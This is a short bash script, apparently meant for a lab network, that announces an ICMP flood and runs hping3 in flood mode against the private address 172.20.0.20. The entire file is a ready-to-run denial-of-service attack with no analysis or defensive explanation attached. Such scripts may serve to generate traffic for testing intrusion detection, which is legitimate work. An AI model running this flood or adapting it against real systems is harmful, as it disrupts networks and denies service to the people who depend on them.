#!/bin/bash

# ICMP Flood Attack Script
TARGET="172.20.0.20"

echo "Starting ICMP Flood attack on $TARGET"
echo "This will send continuous ICMP packets..."
echo "Press Ctrl+C to stop"

# Send ICMP flood
hping3 -1 --flood $TARGET
